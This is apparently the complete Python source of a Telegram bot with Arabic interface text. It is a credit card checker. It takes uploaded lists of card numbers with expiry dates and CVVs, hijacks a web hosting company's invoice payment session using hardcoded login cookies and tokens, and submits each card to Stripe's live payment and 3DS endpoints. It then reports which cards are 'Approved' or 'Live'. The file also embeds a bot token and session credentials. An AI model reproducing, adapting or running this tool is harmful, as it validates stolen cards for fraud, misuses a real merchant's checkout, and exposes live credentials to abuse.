import requests
import re
import urllib3
import time
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== إعدادات ====================
BOT_TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
INVOICE_ID = "260528"

cookies = {
    '_gcl_au': '1.1.1086970495.1761294272',
    '_ga': 'GA1.1.1641871625.1761294273',
    '__stripe_mid': '0204b226-bf2c-4c98-83eb-5fa3551541ec16ac02',
    'inputNotes': '',
    'inputHowDidYouFind': '',
    'howDidRewards': '',
    'WHMCSqCgI4rzA0cru': 'go71bn8nc22avq11bk86rfcmon',
    'WHMCSlogin_auth_tk': 'R1BSNk1nZlBUYTZ0SzM2Z216Wm5wcVNlaUs1Y1BPRUk2RU54b0xJdVdtRzJyNUY4Uk9EajVLL0ZXTHUwRkRyNk44QWhvVHpVOHBKbTQwVE92UmxUTDlXaUR1SWJvQ3hnN3RONEl3VXFONWN1VEZOSFEycEtkMGlZZVRvZWZtbkZIbjlZTjI0NmNLbC9XbWJ4clliYllJejV4YThKTC9RMWZveld3Tm1UMHMxT3daalcrd296c1QxTVk1M3BTSHR0SzJhcmo4Z3hDSWZvVGx6QUZkV3E1QnFDbndHcEg4MXJrSGdwcnQ3WElwYWZnbkZBRVNoRnFvYnhOdE84WU1vd09sVUd0cjd4akJjdW54REVGVUNJcXNrQk5OMU50eWJWS3JMY1AwTm5LbmZHbmMwdEdMdTU3TDZ6cytWOERoczlRZ3BYbmNQaEJ5bUpYcnI3emd1OXhnZGxJVTV0TWV6dnRPRmxESjdDV1QxSWNZeFowMDFGcXlKelBmTXVQK0JuZkNsZHR5R2orNittMGNHeTF2V2tPWUtwUHVKNWxrZVVaSnFzUUE9PQ%3D%3D',
    'VsysFirstVisit': '1761307789',
    '_ga_248YG9EFT7': 'GS2.1.s1761314871$o5$g1$t1761314878$j53$l0$h484498076',
}

# متغيرات عامة
active_checks = {}  # {chat_id: {'stop': False, 'stats': {...}}}

# ==================== Stripe Functions ====================
def get_session_data():
    """جلب session_id و stripe cookies"""
    session = requests.Session()
    
    data = {'token': '771221946304082c891ac6c1542959d0e65da464', 'id': '31940'}
    try:
        session.post(f'https://vsys.host/index.php?rp=/invoice/{INVOICE_ID}/pay', 
                    data=data, cookies=cookies, verify=False, timeout=10)
    except:
        pass
    
    resp = session.get(f'https://vsys.host/viewinvoice.php?id={INVOICE_ID}', 
                       cookies=cookies, verify=False, timeout=10)
    
    m = re.search(r'https://checkout\.stripe\.com/[^\s\'"]+', resp.text)
    if not m or '/pay/' not in m.group(0):
        return None, None, None
    
    session_id = m.group(0).split('/pay/')[1].split('#')[0]
    
    new_cookies = session.cookies.get_dict()
    stripe_mid = new_cookies.get('__stripe_mid', cookies.get('__stripe_mid'))
    stripe_sid = new_cookies.get('__stripe_sid', '')
    
    if not stripe_sid:
        time.sleep(2)
        resp2 = session.get(f'https://vsys.host/viewinvoice.php?id={INVOICE_ID}', 
                           cookies=cookies, verify=False, timeout=10)
        new_cookies2 = session.cookies.get_dict()
        stripe_sid = new_cookies2.get('__stripe_sid', '')
    
    return session_id, stripe_mid, stripe_sid

def check_card(card):
    """فحص البطاقة"""
    parts = card.strip().split('|')
    if len(parts) != 4:
        return "❌ صيغة خاطئة"
    
    cc, mm, yy, cvv = parts
    
    session_id, mid, sid = get_session_data()
    if not session_id:
        return "❌ فشل جلب session"
    
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://checkout.stripe.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    
    pm_data = (
        f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&'
        'billing_details[name]=Card+details&billing_details[email]=test%40test.com&'
        f'billing_details[address][country]=EG&muid={mid}'
    )
    
    if sid:
        pm_data += f'&sid={sid}'
    
    pm_data += (
        '&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
        f'client_attribution_metadata[checkout_session_id]={session_id}'
    )
    
    try:
        r1 = requests.post('https://api.stripe.com/v1/payment_methods', 
                          headers=headers, data=pm_data, timeout=15)
        pm_res = r1.json()
        
        if 'error' in pm_res:
            return f"❌ {pm_res['error'].get('message', 'خطأ')}"
        
        if 'id' not in pm_res:
            return "❌ فشل إنشاء PM"
        
        pm_id = pm_res['id']
        
        confirm_data = f'payment_method={pm_id}&expected_amount=6800'
        if mid:
            confirm_data += f'&muid={mid}'
        if sid:
            confirm_data += f'&sid={sid}'
        confirm_data += f'&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
        
        r2 = requests.post(f'https://api.stripe.com/v1/payment_pages/{session_id}/confirm',
                          headers=headers, data=confirm_data, timeout=15)
        
        confirm_res = r2.json()
        
        if 'payment_intent' not in confirm_res:
            return "⚠️ لا يوجد payment_intent"
        
        pi = confirm_res['payment_intent']
        status = pi.get('status')
        
        if status == 'succeeded':
            return "✅ Approved"
        
        if status == 'requires_action':
            na = pi.get('next_action', {})
            if na.get('type') == 'use_stripe_sdk':
                source_id = na.get('use_stripe_sdk', {}).get('three_d_secure_2_source')
                if source_id:
                    tds_data = (
                        f'source={source_id}&'
                        'browser=%7B%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36%22%7D&'
                        'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
                    )
                    
                    r3 = requests.post('https://api.stripe.com/v1/3ds2/authenticate',
                                      headers=headers, data=tds_data, timeout=15)
                    tds_res = r3.json()
                    
                    trans = tds_res.get('ares', {}).get('transStatus')
                    if not trans:
                        trans = tds_res.get('transStatus')
                    if not trans and 'state' in tds_res:
                        state = tds_res.get('state')
                        if state == 'succeeded':
                            return "✅ Approved (3DS)"
                        elif state == 'failed':
                            return "❌ Declined (3DS)"
                    
                    if trans == 'Y':
                        return "✅ Approved (3DS)"
                    elif trans == 'N':
                        return "✅ Live"
                    elif trans == 'C':
                        return "⚠️ Challenge Required"
                    elif trans == 'R':
                        return "❌ Rejected"
                    else:
                        return f"⚠️ 3DS: {str(tds_res)[:30]}"
        
        error = pi.get('last_payment_error', {})
        if error:
            return f"❌ {error.get('message', error.get('code', status))}"
        
        return f"❌ {status}"
        
    except Exception as e:
        return f"❌ {str(e)[:30]}"

# ==================== Bot Handlers ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """بداية البوت"""
    keyboard = [
        [InlineKeyboardButton("📤 ارسل ملف البطاقات", callback_data="upload")],
        [InlineKeyboardButton("📊 الإحصائيات", callback_data="stats")],
        [InlineKeyboardButton("ℹ️ المساعدة", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        "🤖 *مرحباً بك في بوت فحص البطاقات*\n\n"
        "📋 *طريقة الاستخدام:*\n"
        "1️⃣ ارسل ملف txt يحتوي على البطاقات\n"
        "2️⃣ تنسيق: رقم|شهر|سنة|cvv\n"
        "3️⃣ سيتم الفحص تلقائياً\n\n"
        "⚡️ *المميزات:*\n"
        "• فحص 3 بطاقات في وقت واحد\n"
        "• نتائج فورية لحظية\n"
        "• إحصائيات مفصلة\n"
        "• زر إيقاف الفحص\n\n"
        "اختر من الأزرار بالأسفل 👇"
    )
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة ضغطات الأزرار"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "upload":
        await query.edit_message_text(
            "📤 *ارسل ملف txt الآن*\n\n"
            "الملف يجب أن يحتوي على بطاقات بالتنسيق:\n"
            "`رقم|شهر|سنة|cvv`\n\n"
            "مثال:\n"
            "`4532123456789012|12|25|123`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == "stats":
        chat_id = query.message.chat_id
        if chat_id in active_checks:
            stats = active_checks[chat_id]['stats']
            stats_text = (
                f"📊 *إحصائيات الفحص الحالي*\n\n"
                f"✅ Approved: {stats['approved']}\n"
                f"✅ Live: {stats['live']}\n"
                f"❌ Declined: {stats['declined']}\n"
                f"⚠️ Errors: {stats['errors']}\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📝 المجموع: {stats['total']}\n"
                f"⏱ تم الفحص: {stats['checked']}/{stats['total']}\n"
                f"⏳ الوقت: {stats['elapsed']}"
            )
        else:
            stats_text = "⚠️ لا يوجد فحص نشط حالياً\nارسل ملف للبدء"
        
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back")]]
        await query.edit_message_text(stats_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
    
    elif query.data == "help":
        help_text = (
            "ℹ️ *مساعدة البوت*\n\n"
            "📋 *التنسيق الصحيح:*\n"
            "`رقم_البطاقة|الشهر|السنة|CVV`\n\n"
            "✅ *مثال صحيح:*\n"
            "`4532123456789012|12|25|123`\n"
            "`5425233430109903|01|26|456`\n\n"
            "❌ *أمثلة خاطئة:*\n"
            "~~4532-1234-5678-9012~~ (يحتوي على -)\n"
            "~~4532123456789012 12 25 123~~ (فراغات بدلاً من |)\n\n"
            "⚡️ *ملاحظات:*\n"
            "• يتم فحص 3 بطاقات في وقت واحد\n"
            "• تأخير 3 ثواني بين كل مجموعة\n"
            "• يمكنك إيقاف الفحص في أي وقت\n"
            "• النتائج تظهر فوراً"
        )
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back")]]
        await query.edit_message_text(help_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
    
    elif query.data == "stop_check":
        chat_id = query.message.chat_id
        if chat_id in active_checks:
            active_checks[chat_id]['stop'] = True
            await query.edit_message_text("⛔️ *تم إيقاف الفحص*\n\nيمكنك إرسال ملف جديد", parse_mode=ParseMode.MARKDOWN)
        else:
            await query.answer("لا يوجد فحص نشط", show_alert=True)
    
    elif query.data == "back":
        keyboard = [
            [InlineKeyboardButton("📤 ارسل ملف البطاقات", callback_data="upload")],
            [InlineKeyboardButton("📊 الإحصائيات", callback_data="stats")],
            [InlineKeyboardButton("ℹ️ المساعدة", callback_data="help")]
        ]
        await query.edit_message_text(
            "🤖 *بوت فحص البطاقات*\n\nاختر من الأزرار:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.MARKDOWN
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة ملف البطاقات"""
    chat_id = update.message.chat_id
    
    # التحقق من وجود فحص نشط
    if chat_id in active_checks and not active_checks[chat_id]['stop']:
        await update.message.reply_text("⚠️ يوجد فحص نشط حالياً!\nانتظر حتى ينتهي أو أوقفه أولاً")
        return
    
    # التحقق من نوع الملف
    if not update.message.document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ يجب أن يكون الملف بصيغة txt")
        return
    
    # تحميل الملف
    status_msg = await update.message.reply_text("⏳ جاري تحميل الملف...")
    
    try:
        file = await context.bot.get_file(update.message.document.file_id)
        file_content = await file.download_as_bytearray()
        cards = file_content.decode('utf-8').strip().split('\n')
        cards = [c.strip() for c in cards if c.strip()]
        
        if not cards:
            await status_msg.edit_text("❌ الملف فارغ!")
            return
        
        # بدء الفحص
        await status_msg.edit_text(
            f"✅ تم تحميل {len(cards)} بطاقة\n"
            f"⏳ جاري البدء في الفحص...\n\n"
            f"⚡️ يتم فحص 3 بطاقات في المرة"
        )
        
        # تهيئة الإحصائيات
        active_checks[chat_id] = {
            'stop': False,
            'stats': {
                'total': len(cards),
                'checked': 0,
                'approved': 0,
                'live': 0,
                'declined': 0,
                'errors': 0,
                'start_time': time.time(),
                'elapsed': '0s'
            }
        }
        
        # بدء الفحص
        await process_cards(update, context, cards, chat_id)
        
    except Exception as e:
        await status_msg.edit_text(f"❌ خطأ في قراءة الملف:\n`{str(e)}`", parse_mode=ParseMode.MARKDOWN)

async def process_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, chat_id: int):
    """معالجة البطاقات"""
    stats = active_checks[chat_id]['stats']
    
    for i in range(0, len(cards), 3):
        # التحقق من زر الإيقاف
        if active_checks[chat_id]['stop']:
            await context.bot.send_message(
                chat_id,
                "⛔️ *تم إيقاف الفحص*\n\n"
                f"📊 *النتيجة النهائية:*\n"
                f"✅ Approved: {stats['approved']}\n"
                f"✅ Live: {stats['live']}\n"
                f"❌ Declined: {stats['declined']}\n"
                f"⚠️ Errors: {stats['errors']}\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📝 تم الفحص: {stats['checked']}/{stats['total']}",
                parse_mode=ParseMode.MARKDOWN
            )
            del active_checks[chat_id]
            return
        
        batch = cards[i:i+3]
        results = []
        threads = []
        
        # فحص المجموعة
        for card in batch:
            t = threading.Thread(target=lambda c, r: r.append(check_card(c)), args=(card, results))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        # إعداد الرسالة
        message_text = f"📦 *المجموعة {i//3 + 1}*\n\n"
        
        for j, card in enumerate(batch):
            result = results[j] if j < len(results) else "❌ خطأ"
            cc_num = card.split('|')[0]
            masked = f"`{cc_num[:6]}******{cc_num[-4:]}`"
            
            message_text += f"{masked}\n{result}\n\n"
            
            # تحديث الإحصائيات
            stats['checked'] += 1
            if '✅ Approved' in result or '✅ Live' in result:
                if 'Approved' in result:
                    stats['approved'] += 1
                else:
                    stats['live'] += 1
            elif '❌' in result:
                stats['declined'] += 1
            else:
                stats['errors'] += 1
        
        # حساب الوقت
        elapsed = int(time.time() - stats['start_time'])
        stats['elapsed'] = f"{elapsed}s"
        
        message_text += (
            f"━━━━━━━━━━━━━━━\n"
            f"📊 *التقدم:* {stats['checked']}/{stats['total']}\n"
            f"⏱ *الوقت:* {stats['elapsed']}"
        )
        
        # إضافة زر الإيقاف
        keyboard = [
            [InlineKeyboardButton("⛔️ إيقاف الفحص", callback_data="stop_check")],
            [InlineKeyboardButton("📊 الإحصائيات", callback_data="stats")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(chat_id, message_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
        
        # تأخير بين المجموعات
        if i + 3 < len(cards):
            time.sleep(3)
    
    # النتيجة النهائية
    final_text = (
        "🎉 *اكتمل الفحص!*\n\n"
        f"📊 *النتيجة النهائية:*\n"
        f"✅ Approved: {stats['approved']}\n"
        f"✅ Live: {stats['live']}\n"
        f"❌ Declined: {stats['declined']}\n"
        f"⚠️ Errors: {stats['errors']}\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📝 المجموع: {stats['total']}\n"
        f"⏱ الوقت الكلي: {stats['elapsed']}"
    )
    
    keyboard = [[InlineKeyboardButton("📤 ارسل ملف جديد", callback_data="upload")]]
    await context.bot.send_message(chat_id, final_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
    
    # حذف البيانات
    del active_checks[chat_id]

def main():
    """تشغيل البوت"""
    print("🤖 Starting bot...")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ Bot is running!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
